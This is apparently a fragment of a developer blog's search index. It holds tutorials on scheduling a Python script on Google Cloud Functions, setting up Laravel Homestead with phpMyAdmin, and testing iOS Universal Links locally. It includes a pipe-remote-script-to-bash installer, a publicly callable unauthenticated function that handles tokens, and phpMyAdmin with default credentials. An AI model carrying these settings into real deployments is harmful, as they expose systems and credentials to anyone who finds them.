str(e) def sendLineNotification(message): data = { \"to\" : \"insert your User ID here\", \"messages\" : [ { \"type\" : \"text\", \"text\" : message } ] } headers = { \"Content-Type\" : \"application/json\", \"Authorization\" : \"insert channel access token here\" } request = requests.post('https://api.line.me/v2/bot/message/push', json=data, headers=headers)Let’s test to see if the notification was sent successfully:Success! As a side note, I initially intended to use Gmail SMTP to send notifications via email, but after deploying to Google Cloud, I found it couldn’t be used…3. Deploying the Python Script to Google CloudNow that the basics are covered, we will officially move on to the main event of this article: deploying the Python script to the cloud.Initially, I considered using Google Cloud Run, but found it too complex for my needs, which are quite simple; therefore, I opted for Google Cloud Function, a serverless solution commonly used to build serverless web services. If you haven’t used Google Cloud before, please go to the Console to create a new project and set up billing information. On the project console homepage, click “Cloud Functions” under resources. At the top, select “Create Function.” Enter the basic information. ⚠️ Make sure to note the “ Trigger URL“.Available regions: US-WEST1, US-CENTRAL1, US-EAST1 can enjoy free Cloud Storage service quotas. asia-east2 (Hong Kong) is closer to us but incurs a small Cloud Storage fee. ⚠️ When creating Cloud Functions, Cloud Storage will be needed to host the code. ⚠️ For detailed pricing, please refer to the end of the article.Trigger condition: HTTPAuthentication: Based on my needs, I want to be able to execute the script from an external link, so I choose “Allow unauthenticated invocations”; if authentication is required, the subsequent Scheduler service will also need corresponding settings.Variables, networking, and advanced settings can be set in the variables section for Python to use (this way, if parameters change, you won’t need to modify the Python code):How to call in Python:import osdef main(request): return os.environ.get('test', 'DEFAULT VALUE')No other settings need to be changed; just click “Save” -&gt; “Next.” Select the runtime as “Python 3.x” and paste the written Python script, changing the entry point to “main.”Supplementing main(args), as mentioned earlier, this service is more suited for serverless web applications; thus, args is actually the Request object, from which you can retrieve HTTP GET query and HTTP POST body data, as follows:To get GET Query information:request_args = args.argsExample: ?name=zhgchgli =&gt; request_args = [“name”:”zhgchgli”]To get POST Body data:request_json = request.get_json(silent=True)Example: name=zhgchgli =&gt; request_json = [“name”:”zhgchgli”]If testing POST with Postman, remember to use “Raw+JSON” for POST data; otherwise, there will be nothing: After the code section is okay, switch to “requirements.txt” and input the necessary package dependencies:We use the “requests” package to help us call the API, which is not included in the native Python library; thus, we need to add it here:requests&gt;=2.25.1You can specify the version as ≥ 2.25.1, or simply input requests to install the latest version. Once everything is okay, click “Deploy” to start the deployment.It will take about 1-3 minutes for the deployment to complete. After deployment, you can execute the script using the “ Trigger URL “ noted earlier to check if it runs correctly, or use “Actions” -&gt; “Test Function” to perform a test.If you see 500 Internal Server Error, it means there is an error in the code. You can click on the name to view the “Logs” and find the reason:UnboundLocalError: local variable 'db' referenced before assignment After clicking on the name, you can also click “Edit” to modify the script content. If testing is successful, we have successfully deployed the Python script to the cloud!Supplement on VariablesAccording to our needs, we need a place to store and read the token for the check-in app; since the token may expire, we need to request it again and write it for use in the next execution.To dynamically pass variables into the script from external sources, there are the following methods: [Read Only] The previously mentioned runtime environment variables. [Temp] Cloud Functions provides a /tmp directory for writing and reading files during execution, but it will be deleted after the execution ends; for details, please refer to the official documentation. [Read Only] Sending data via GET/POST. [Read Only] Including additional files.In the program, using the relative path `./` allows for reading, **but only for reading; dynamic modification is not possible**; to modify, you can only do so in the console and redeploy.&gt; _If you want to read and dynamically modify, you need to connect to other GCP services, such as: Cloud SQL, Google Storage, Firebase Cloud Firestore…_- \\[Read &amp; Write\\] Here, I chose Firebase Cloud _Firestore_ because currently, this option has a free quota available.**According to the [Getting Started Steps](https://firebase.google.com/docs/firestore/quickstart#read_data){:target=\"_blank\"}, after setting up the Firebase project; enter the Firebase backend:**![](/assets/70a1409b149a/1*0DO31noJ4a3xweb1annbSQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjUxMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }In the left menu, find “ **Cloud Firestore** ” -&gt; “ **Add Collection** ”![](/assets/70a1409b149a/1*7c9sA8ZbxE6uGh6f-nfiVA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MDUiIGhlaWdodD0iMzc3Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Enter the collection ID.![](/assets/70a1409b149a/1*wcp94_25maNL9EoFJTOndA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MTUiIGhlaWdodD0iNTIyIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Enter the data content.A collection can have multiple documents, and each document can have its own field content; it is very flexible to use.**Using in Python:**First, go to [GCP Console -&gt; IAM &amp; Admin -&gt; Service Accounts](https://console.cloud.google.com/iam-admin/serviceaccounts){:target=\"_blank\"}, and follow the steps below to download the authentication private key file:First, select the account:![](/assets/70a1409b149a/1*JeB9m4BWzfRCZSofHq2tLg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjIzNiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }At the bottom, “Add Key” -&gt; “Create New Key”![](/assets/70a1409b149a/1*xi9nQUy48-QlFI4BEdIMew.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NTMiIGhlaWdodD0iNzQ3Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Select “JSON” to download the file.![](/assets/70a1409b149a/1*bsphvdEHgg0XDnHAHMXJvg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NTgiIGhlaWdodD0iMzUyIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Place this JSON file in the same project directory as your Python code.**In the local development environment:**```bashpip install --upgrade firebase-adminInstall the firebase-admin package.In Cloud Functions, you need to add firebase-admin to the requirements.txt.Once the environment is set up, you can read the data we just added:firebase_admin.py:import firebase_adminfrom firebase_admin import credentialsfrom firebase_admin import firestoreif not firebase_admin._apps: cred = credentials.Certificate('./authentication.json') firebase_admin.initialize_app(cred)# If you call initialize_app again, it will throw the following error# providing an app name as the second argument. In most cases, you only need to call initialize_app() once. But if you do want to initialize multiple apps, pass a second argument to initialize_app() to give each app a unique name.# So for safety, check if it has already been initialized before calling initialize_app.db = firestore.client()ref = db.collection(u'example') # Collection namestream = ref.stream()for data in stream: print(\"id:\" + data.id + \",\" + data.to_dict()) If you are on Cloud Functions, besides uploading the authentication JSON file, you can also change the connection syntax to use the following:cred = credentials.ApplicationDefault()firebase_admin.initialize_app(cred, { 'projectId': project_id,})db = firestore.client() If you see Failed to initialize a certificate credential., please check if the authentication JSON is correct.For adding, deleting, and more operations, please refer to the official documentation.4. Setting Up Automatic Scheduling in Google CloudNow that we have the script, we need to make it run automatically to achieve our ultimate goal. Go to the Google Cloud Scheduler console homepage. Click “Create Job” at the top. Enter the basic job information.Execution Frequency: Input format is the same as crontab. If you are not familiar with crontab syntax, you can directly use crontab.guru, this amazing website:It can clearly translate the actual meaning of the syntax you set. (Click next to see the next execution time.) Here, I set 15 1 * * *, because the sign-in only needs to run once a day, scheduled to run at 1:15 AM daily.URL Section: Enter the previously noted “ Trigger URL ”Timezone: Enter “Taiwan”, select Taipei Standard Time.HTTP Method: According to the previous Python code, we can just use GET.If you set “Authentication” earlier, remember to expand “SHOW MORE” to configure the authentication settings.Once everything is filled out, click “ Create ”. After successful creation, you can choose “Run Now” to test if it works properly. You can check the execution results and the last execution date. ⚠️ Please note, execution results marked as “failed” only refer to web status codes between 400-500 or errors in the Python code.Mission Accomplished!We have achieved the goal of uploading the routine task Python script to the cloud and setting up automatic scheduling for it to run automatically.Pricing MethodAnother important aspect is the pricing method; Google Cloud and Linebot are not entirely free services, so understanding the billing method is crucial; otherwise, for a small script, paying too much money is not worth it compared to just running it on a computer.LinebotRefer to the official pricing information, which allows for 500 messages per month for free.Google Cloud FunctionsRefer to the official pricing information, which includes 2 million invocations per month, 400,000 GB-seconds, and 200,000 GHz-seconds of compute time, along with 5 GB of outbound internet traffic.Google Firebase Cloud FirestoreRefer to the official pricing information, which includes 1 GB of storage, 10 GB of traffic per month, 50,000 reads, and 20,000 writes/deletes per day; this is sufficient for light usage!Google Cloud SchedulerRefer to the official pricing information, which allows for 3 free jobs to be set up per account. For scripts, the above free usage is more than enough!Google Cloud Storage Conditional Free TierDespite trying to avoid it, there are still services that may incur charges.Once Cloud Functions are created, two Cloud Storage instances will be automatically created:If you selected US-WEST1, US-CENTRAL1, or US-EAST1 for Cloud Functions, you can enjoy free usage quotas:I chose US-CENTRAL1, and indeed, the first Cloud Storage instance is in US-CENTRAL1, but the second is labeled multiple regions in the US; I estimate that this will incur charges.Refer to the official pricing information, which varies based on the region of the host.The code is not large, but I estimate it should incur a minimum charge of 0.0X0 per month (?) ⚠️ The above information was recorded as of 2021/02/21; actual prices may vary, and this is for reference only.Budget Control NotificationsJust in case… if there are indeed situations where the free usage exceeds and charges begin, I would like to receive notifications; to avoid being unaware of potential errors in the program that could cause unexpected billing amounts… Go to the Console Find the “ Billing ” card:Click “ View Detailed Billing History ” to enter. Expand the left menu and go to the “ Budgets &amp; Alerts ” feature. Click “ Create Budget ” at the top. Enter a custom name.Next step. For the amount, enter the “ Target Amount ”, which can be $1 or $10; we don’t want to spend too much on small things.Next step.In the actions section, you can set notifications to trigger when the budget reaches a certain percentage.Check “ Send alerts via email to billing administrators and users ”, so that when the conditions are met, you can receive notifications immediately.Click “Finish” to submit and save.When the budget exceeds, we will know immediately to avoid incurring more costs.SummaryHuman energy is limited, and in today’s flood of technological information, every platform and service wants to extract our limited energy; if we can use some automation scripts to share our daily lives, little by little, we can save more energy to focus on what’s important!Further Reading Creating a Fully Automated WFH Employee Health Reporting System with Slack Crashlytics + Big Query: Building a More Immediate and Convenient Crash Tracking Tool Crashlytics + Google Analytics: Automatically Querying App Crash-Free Users Rate Apps Use HTTPS for Transmission, but Data Still Gets Stolen. How to Create an Interesting Engineering CTF Competition iOS 14 Clipboard Theft Panic: The Dilemma of Privacy vs. Convenience Using Google Apps Script to Forward Gmail Messages to SlackIf you have any questions or suggestions, feel free to contact me.If you have any automation-related optimization needs, feel free to hire me, thank you.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 13,657 Total Views Last Statistics Date: 2025-08-15 | 13,322 Views on Medium." }, { "title": "重灌筆記1-Laravel Homestead + phpMyAdmin 環境建置", "url": "/posts/zrealm-dev/%E9%87%8D%E7%81%8C%E7%AD%86%E8%A8%981-laravel-homestead-phpmyadmin-%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE-87090f101b9a/", "categories": "ZRealm Dev.", "tags": "ios-app-development, php, laravel, vagrant, virtualbox", "date": "2021-02-05 14:01:41 +0800", "snippet": "[重灌筆記1] -Laravel Homestead + phpMyAdmin 環境建置從 0 到 1 建置 Laravel 開發環境並搭配 phpMyAdmin GUI 管理 MySql 資料庫Laravel 最近把 Mac Reset 一遍，紀錄一下重新還原 Laravel 開發環境的步驟。環境需求 Vagrant ：虛擬環境配置工具 VirtualBox ：免費虛擬機軟體，如果已...", "content": "[重灌筆記1] -Laravel Homestead + phpMyAdmin 環境建置從 0 到 1 建置 Laravel 開發環境並搭配 phpMyAdmin GUI 管理 MySql 資料庫Laravel 最近把 Mac Reset 一遍，紀錄一下重新還原 Laravel 開發環境的步驟。環境需求 Vagrant ：虛擬環境配置工具 VirtualBox ：免費虛擬機軟體，如果已有購買 Parallels 也可直接使 Parallels（但需要安裝 plug-in ）下載、安裝完這兩個軟體後，繼續下一步設定。 VirtualBox 安裝時會要求要重新開機還有要到「設定」-&gt;「安全性與隱私權」-&gt;「Allow VirtualBox」才能啟用所有服務。配置 Homestead 環境git clone https://github.com/laravel/homestead.git ~/Homesteadcd ~/Homesteadgit checkout releasebash init.shphpMyAdmin phpMyAdmin 是一個以PHP為基礎，以Web-Base方式架構在網站主機上的MySQL的資料庫管理工具，讓管理者可用Web介面管理MySQL資料庫。藉由此Web介面可以成為一個簡易方式輸入繁雜SQL語法的較佳途徑，尤其要處理大量資料的匯入及匯出更為方便。 — Wiki phpMyAdmin到 phpMyAdmin 官網下載最新版本回來。解壓縮 .zip -&gt; 資料夾 -&gt; 重新命名資料夾名稱 -&gt; 「phpMyAdmin」：將 phpMyAdmin 資料夾移動到 ~/Homestead 資料夾中：phpMyAdmin 設定在 phpMyAdmin 資料夾中找到 config.sample.inc.php ，將其改名為 config.inc.php ，並使用編輯器打開，修改成以下設定：&lt;?php/* vim: set expandtab sw=4 ts=4 sts=4: *//** * phpMyAdmin sample configuration, you can use it as base for * manual configuration. For easier setup you can use setup/ * * All directives are explained in documentation in the doc/ folder * or at &lt;https://docs.phpmyadmin.net/&gt;. * * @package PhpMyAdmin */declare(strict_types=1);/** * This is needed for cookie based authentication to encrypt password in * cookie. Needs to be 32 chars long. */$cfg['blowfish_secret'] = ''; /* YOU MUST FILL IN THIS FOR COOKIE AUTH! *//** * Servers configuration */$i = 0;/** * First server */$i++;/* Authentication type */$cfg['Servers'][$i]['auth_type'] = 'config';/* Server parameters */$cfg['Servers'][$i]['host'] = 'localhost';$cfg['Servers'][$i]['user'] = 'homestead';$cfg['Servers'][$i]['password'] = 'secret';$cfg['Servers'][$i]['compress'] = false;$cfg['Servers'][$i]['AllowNoPassword'] = false;/** * phpMyAdmin configuration storage settings. *//* User used to manipulate with storage */// $cfg['Servers'][$i]['controlhost'] = '';// $cfg['Servers'][$i]['controlport'] = '';// $cfg['Servers'][$i]['controluser'] = 'pma';// $cfg['Servers'][$i]['controlpass'] = 'pmapass';/* Storage database and tables */// $cfg['Servers'][$i]['pmadb'] = 'phpmyadmin';// $cfg['Servers'][$i]['bookmarktable'] = 'pma__bookmark';// $cfg['Servers'][$i]['relation'] = 'pma__relation';// $cfg['Servers'][$i]['table_info'] = 'pma__table_info';// $cfg['Servers'][$i]['table_coords'] = 'pma__table_coords';// $cfg['Servers'][$i]['pdf_pages'] = 'pma__pdf_pages';// $cfg['Servers'][$i]['column_info'] = 'pma__column_info';// $cfg['Servers'][$i]['history'] = 'pma__history';// $cfg['Servers'][$i]['table_uiprefs'] = 'pma__table_uiprefs';// $cfg['Servers'][$i]['tracking'] = 'pma__tracking';// $cfg['Servers'][$i]['userconfig'] = 'pma__userconfig';// $cfg['Servers'][$i]['recent'] = 'pma__recent';// $cfg['Servers'][$i]['favorite'] = 'pma__favorite';// $cfg['Servers'][$i]['users'] = 'pma__users';// $cfg['Servers'][$i]['usergroups'] = 'pma__usergroups';// $cfg['Servers'][$i]['navigationhiding'] = 'pma__navigationhiding';// $cfg['Servers'][$i]['savedsearches'] = 'pma__savedsearches';// $cfg['Servers'][$i]['central_columns'] = 'pma__central_columns';// $cfg['Servers'][$i]['designer_settings'] = 'pma__designer_settings';// $cfg['Servers'][$i]['export_templates'] = 'pma__export_templates';/** * End of servers configuration *//** * Directories for saving/loading files from server */$cfg['UploadDir'] = '';$cfg['SaveDir'] = '';/** * Whether to display icons or text or both icons and text in table row * action segment. Value can be either of 'icons', 'text' or 'both'. * default = 'both' *///$cfg['RowActionType'] = 'icons';/** * Defines whether a user should be displayed a \"show all (records)\" * button in browse mode or not. * default = false *///$cfg['ShowAll'] = true;/** * Number of rows displayed when browsing a result set. If the result * set contains more rows, \"Previous\" and \"Next\". * Possible values: 25, 50, 100, 250, 500 * default = 25 *///$cfg['MaxRows'] = 50;/** * Disallow editing of binary fields * valid values are: * false allow editing * 'blob' allow editing except for BLOB fields * 'noblob' disallow editing except for BLOB fields * 'all' disallow editing * default = 'blob' *///$cfg['ProtectBinary'] = false;/** * Default language to use, if not browser-defined or user-defined * (you find all languages in the locale folder) * uncomment the desired line: * default = 'en' *///$cfg['DefaultLang'] = 'en';//$cfg['DefaultLang'] = 'de';/** * How many columns should be used for table display of a database? * (a value larger than 1 results in some information being hidden) * default = 1 *///$cfg['PropertiesNumColumns'] = 2;/** * Set to true if you want DB-based query history.If false, this utilizes * JS-routines to display query history (lost by window close) * * This requires configuration storage enabled, see above. * default = false *///$cfg['QueryHistoryDB'] = true;/** * When using DB-based query history, how many entries should be kept? * default = 25 *///$cfg['QueryHistoryMax'] = 100;/** * Whether or not to query the user before sending the error report to * the phpMyAdmin team when a JavaScript error occurs * * Available options * ('ask' | 'always' | 'never') * default = 'ask' *///$cfg['SendErrorReports'] = 'always';/** * You can find more configuration options in the documentation * in the doc/ folder or at &lt;https://docs.phpmyadmin.net/&gt;. */主要是新增修改這三項設定：$cfg['Servers'][$i]['auth_type'] = 'config';$cfg['Servers'][$i]['user'] = 'homestead'; homestead 預設 mysql 帳號密碼 homestead / secret 。配置 Homestead 設定用編輯器打開 ~/Homestead/Homestead.yaml 設定檔。---ip: \"192.168.10.10\"memory: 2048cpus: 2provider: virtualboxauthorize: ~/.ssh/id_rsa.pubkeys: - ~/.ssh/id_rsafolders: - map: ~/Projects/Web to: /home/vagrant/code - map: ~/Homestead/phpMyAdmin to: /home/vagrant/phpMyAdminsites: - map: phpMyAdmin.test to: /home/vagrant/phpMyAdmindatabases: - homesteadfeatures: - mysql: false - mariadb: false - postgresql: false - ohmyzsh: false - webdriver: false#services:# - enabled:# - \"postgresql@12-main\"# - disabled:# - \"postgresql@11-main\"# ports:# - send: 50000# to: 5000# - send: 7777# to: 777# protocol: udp IP : 預設是 192.168.10.10 可改可不 provider ：預設是 virtualbox ，如果用 Parallels 才需要改 folders: 新增- map: ~/Homestead/phpMyAdminto: /home/vagrant/phpMyAdmin sites: 新增- map: phpMyAdmin.test to: /home/vagrant/phpMyAdmin如果已經有 Laravel 專案也可以一併在此新增，例如我專案都放在 ~/Projects/Web 下，所以我也先把目錄映射加上去。sites 是設定本機虛擬網域與目錄映射，我們還需要修改本地 Hosts 檔增網域虛擬機映射：使用 Finder -&gt; Go -&gt; /etc/hosts ，找到 hosts 檔案；複製到桌面（因無法直接修改） 網域名稱可隨意自訂，反正只有自己本機可以 Access。打開複製出來的 Hosts 檔案，增加 sites 紀錄：&lt;homestead IP 位置&gt; &lt;網域名稱&gt;修改好之後儲存，然後再剪下貼回 /etc/hosts ，覆蓋掉即可。安裝&amp;啟動 Homestead Virtual Machinecd ~/Homesteadvagrant up --provision ⚠️請注意 ，如果沒加 --provision 則設定檔不會更新，輸入網址會出現 no input file specified 錯誤。第一次啟動，需要下載 Homestead 環境包，需要較長的時間。如果沒有出現特別的錯誤即表示啟動成功，可以下：vagrant sshssh 進入虛擬機。檢查 phpMyAdmin 是否正確連線前往 http://phpmyadmin.test/ 檢查是否正常開啟。成功！我們遇到要操作資料庫的地方，直接進來這邊修改即可。新建 Laravel 專案如果你有已存在的專案，到這一步已經可以從瀏覽器在本地運行了，如果沒有，這邊補充一下新建 Laravel 專案的方式。~/Homesteadvagrant sshvagrant ssh 進 VM，然後 cd 到 code 目錄：cd ./code下 laravel new 專案名稱，建立 Laravel 專案：(以 blog 為例)laravel new blogblog 專案建立成功！再來我們要將專案設定本機器存取測試網域：回頭打開編輯 ~/Homestead/Homestead.yaml 設定檔。在 sites 中新增一筆紀錄：sites: - map: myblog.test to: /home/vagrant/code/blog/public記得 hosts 也要加上對應紀錄：192.168.10.10. myblog.test最後重啟 homestead：vagrant reload --provision在瀏覽器輸入 http://myblog.test 測試是否正確建立＆運行：完成！補充 — Mac 安裝 Composer雖然已經有用 Homestead 可以不需要另外裝 Composer，但考慮到有的 PHP 專案並不一定使用 Laravel 所以還是要在本機上安裝 Composer。 Composer複製下載區段的指令，將 php composer-setup.php 替換為：php composer-setup.php - install-dir=/usr/local/bin - filename=composerComposer v2.0.9 範例:php -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"php -r \"if (hash_file('sha384', 'composer-setup.php') === '756890a4488ce9024fc62c56153228907f1545c228516cbf63f885e036d37e9a59d27d63f46af1d4d07ee0f76181c7d3') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;\"php composer-setup.php --install-dir=/usr/local/bin --filename=composerphp -r \"unlink('composer-setup.php');\"並依序在 terminal 輸入指令。 ⚠️請注意 ，不要直接複製使用以上範例，因為隨著 Composer 版本更新 hash check 碼也會跟著變。輸入 composer -V 確認版本＆安裝成功！參考資料 https://laravel.com/docs/8.x/homestead https://getcomposer.org/download/有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,340 Total Views Last Statistics Date: 2025-08-15 | 1,319 Views on Medium." }, { "title": "Universal Links 新鮮事", "url": "/posts/zrealm-dev/universal-links-%E6%96%B0%E9%AE%AE%E4%BA%8B-12c5026da33d/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, universal-links, app-store, deeplink", "date": "2021-02-04 11:57:25 +0800", "snippet": "Universal Links 新鮮事iOS 13, iOS 14 Universal Links 新鮮事＆建立本地測試環境Photo by NASA前言對於一個有網站又有 APP 的服務， Universal Links 的功能對於使用者體驗來說無比的重要，能達到 Web 與 APP 之間的無縫接軌；但一直以來都只有簡單設置，沒有太多的著墨；前陣子剛好又遇到花了點時間研究了一下，把一些有趣...", "content": "Universal Links 新鮮事iOS 13, iOS 14 Universal Links 新鮮事＆建立本地測試環境Photo by NASA前言對於一個有網站又有 APP 的服務， Universal Links 的功能對於使用者體驗來說無比的重要，能達到 Web 與 APP 之間的無縫接軌；但一直以來都只有簡單設置，沒有太多的著墨；前陣子剛好又遇到花了點時間研究了一下，把一些有趣的事記錄下來。常見考量經手過的服務，對於實作 Universal Links 的考量都是 APP 上並沒有實作完整的網站功能，Universal Links 認的是域名，只要域名匹配到就會開啟 APP；關於這個問題可以下 NOT 排除 APP 上沒有相應功能的網址，若網站服務網址很極端，那乾脆新建一個 subdomain 用來做 Universal Links。apple-app-site-association 何時更新？ iOS &lt; 14，APP 在第一次安裝、更新時會去詢問 Universal Links 網站的 apple-app-site-association。 iOS ≥ 14 ，則是由 Apple CDN 做快取定期更新 Universal Links 網站的 apple-app-site-association；APP 在第一次安裝、更新時會去跟 Apple CDN 拿取；但這邊就會有個問題，Apple CDN 的 apple-app-site-association 可能還是舊的。關於 Apple CDN 的更新機制，查了一下文件，沒有提到；查了下 討論 ，官方也只回應「會定期更新」細節之後會發佈在文件…但至今依然還沒看到。 我自己覺得應該最慢 48 小時，就會更新吧。。。所以下次有更改到 apple-app-site-association 的話建議在 APP 上架更新前幾天就先改好 apple-app-site-association 上線。apple-app-site-association Apple CDN 確認：Headers: HOST=app-site-association.cdn-apple.comGET https://app-site-association.cdn-apple.com/a/v1/你的網域可以取得當前 Apple CDN 上的版本長怎樣。（記得加上 Request Header Host=https://app-site-association.cdn-apple.com/ ）iOS ≥ 14 Debug因前述的 CDN 問題，那我們在開發階段該如何 debug 呢？還好這部分蘋果有給解決方法，不然沒辦法即時更新真的要吐血了；我們只需要再 applinks:domain.com 加上 ?mode=developer 即可，另外還有 managed(for 企業內部 APP) , or developer+managed 模式可設定。加上 mode=developer 後，APP 在模擬器上每次 Build &amp; Ｒun 時都會直接跟網站拿最新的 app-site-association 來用。如果要 Build &amp; Run 在實機則要先去「設定」-&gt;「開發者」-&gt; 打開「Associated Domains Development」選項即可。 ⚠️ 這邊有個坑 ，app-site-association 可以放在網站根目錄或是 ./.well-known 目錄下；但在 mode=developer 下他只會問 ./.well-known/app-site-association ，害我以為怎麼沒效。開發測試如果是 iOS &lt;14 記得有更改過 app-site-association 的話要刪掉再重 Build &amp; Run APP 才會去抓最新的回來，iOS ≥ 14 請參考前述方法加上 mode=developer。app-site-association 內容的修改，好一點的話可以自行修改伺服器上的檔；但對於有時候碰不到伺服器端的我們來說，如果要做 universal links 的測試會非常的麻煩，要不停的麻煩後端同事幫忙，變成要很確定 app-site-association 內容後一次上線，一直改來改去會把同事逼瘋。在本地建一個模擬環境為了解決上述問題，我們可以在本地起一個小服務。首先在 mac 上安裝 nginx：brew install nginx如果沒安裝過 brew 可先安裝：/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"安裝完 nginx 後，前往 /usr/local/etc/nginx/ 打開編輯 nginx.conf 檔案：...略server { listen 8080; server_name localhost;#charset koi8-r;#access_log logs/host.access.log main;location / { root /Users/zhgchgli/Documents; index index.html index.htm; }...略大概在第 44 行的位置將 location / 裡的 root 換成你想要的目錄位置（這邊以 Documents 為例）。 listen on 8080 port ，如果沒有衝突則不需要修改。儲存修改完後，下指令啟動 nginx：nginx若要停止時，則下：nginx -s stop停止。如果有更改 nginx.conf 記得要下：nginx -s reload重新啟用服務。建立一個 ./.well-known 目錄在剛設定的 root 目錄內，並將 apple-app-site-association 檔案放到 ./.well-known 內。 ⚠️ .well-known 建立後若消失，請注意 Mac 要打開「顯示隱藏資料夾」功能：在 terminal 下：defaults write com.apple.finder AppleShowAllFiles TRUE再下 killall finder 重啟所有 finder，即可。 ⚠️ apple-app-site-association 看起來沒有副檔名，但實際還是有 .json 副檔名：在檔案上按右鍵 -&gt; 「取得資訊 Get Info」-&gt;「Name &amp; Extension」-&gt; 檢查有無副檔名＆同時可取消勾選「隱藏檔案類型 Hide extension」沒問題後，打開瀏覽器測試以下連結是否正常下載 apple-app-site-association：http://localhost:8080/.well-known/apple-app-site-association如果能正常下載代表本地環境模擬成功！ 如果出現 404/403 錯誤則請檢查 root 目錄是否正確、目錄/檔案是否有放入、apple-app-site-association 是否不小心帶了副檔名( .json)。註冊＆下載 Ngrokngrok.com解壓縮出 ngrok 執行檔進入 Dashboard 頁面 執行 Config 設定./ngrok authtoken 你的TOKEN設定好之後，下：./ngrok http 8080 因我們的 nginx 在 8080 port。啟動服務。這時候我們會看到一個服務啟動狀態視窗，可以從 Forwarding 中取的此次分配到的公開網址。 ⚠️ 每次啟動分配到的網址都會變，所以僅能作為開發測試使用。 這邊以此次分配到的網址 https://ec87f78bec0f.ngrok.io/ 為例回到瀏覽器改輸入 https://ec87f78bec0f.ngrok.io/.well-known/apple-app-site-association 看看能不能正常下載瀏覽 apple-app-site-association 檔案，如果沒問題則可繼續下一步。將 ngrok 分配到的網址輸入到 Associated Domains applinks: 設定中。記得帶上 ?mode=developer 方便我們測試。重新 Build &amp; Run APP：打開瀏覽器輸入相應的 Universal Links 測試網址（EX: https://ec87f78bec0f.ngrok.io/buy/123 ）查看效果。 頁面出現 404 不要理他，因為我們實際沒有那一頁；我們只是要測 iOS 對網址匹配的功能符不符合我們預期；如果上方有出現 「Open」代表匹配成功，另外也可以測 NOT 反向的狀況。點擊「Open」後開啟 APP -&gt; 測試成功！ 開發階段都測試 OK 後，將確認修改過之後的 apple-app-site-association 檔案再交給後端上傳到伺服器就能確保萬無一失囉～ 最後記得將 Associated Domains applinks: 改為正試機網址。另外我們也可以從 ngrok 運行狀態視窗中看到每次 APP Build &amp; Run 有沒有跟我們要 apple-app-site-association 檔案：Applinks 設定內容iOS &lt; 13 之前：設定檔較簡單，只有以下內容可設定：{ \"applinks\": { \"apps\": [], \"details\": [ { \"appID\" : \"TeamID.BundleID\", \"paths\": [ \"NOT /help/\", \"*\" ] } ] }}將 TeamID.BundleId 換成你的專案設定 (ex: TeamID = ABCD , BundleID = li.zhgchg.demoapp =&gt; ABCD.li.zhgchg.demoapp )。 如果有多個 appID 則要重複加入多組。paths 部分則為匹配規則，能支援以下幾種語法： * ：匹配 0~多個字元，ex: /home/* (home/alan…) ? ：匹配 1 個字元，ex: 201? (2010~2019) ?* ：匹配 1 個~多個字元，ex: /?* (/test、/home. . ) NOT ：反向排除，ex: NOT /help (any url but /help)更多玩法組合可自己依照實際情況決定，更多資訊可參考 官方文件 。 - 請注意，他不是 Regex，不支援任何 Regex 寫法。 - 舊版不支援 Query (?name=123)、Anchor ( #title)。 - 中文網址須先轉成 ASCII 後才能放在 paths 中 (所有url 字元均要是 ASCII)。iOS ≥ 13 之後：強化了設定檔內容的功能，多增加支援 Query/Anchor、字符集、編碼處理。\"applinks\": { \"details\": [ { \"appIDs\": [ \"TeamID.BundleID\" ], \"components\": [ { \"#\": \"no_universal_links\", \"exclude\": true, \"comment\": \"Matches any URL whose fragment equals no_universal_links and instructs the system not to open it as a universal link\" }, { \"/\": \"/buy/*\", \"comment\": \"Matches any URL whose path starts with /buy/\" }, { \"/\": \"/help/website/*\", \"exclude\": true, \"comment\": \"Matches any URL whose path starts with /help/website/ and instructs the system not to open it as a universal link\" }, { \"/\": \"/help/*\", \"?\": { \"articleNumber\": \"????\" }, \"comment\": \"Matches any URL whose path starts with /help/ and that has a query item with name 'articleNumber' and a value of exactly 4 characters\" } ] } ]}轉貼自官方文件，可以看到格式有所改變。appIDs 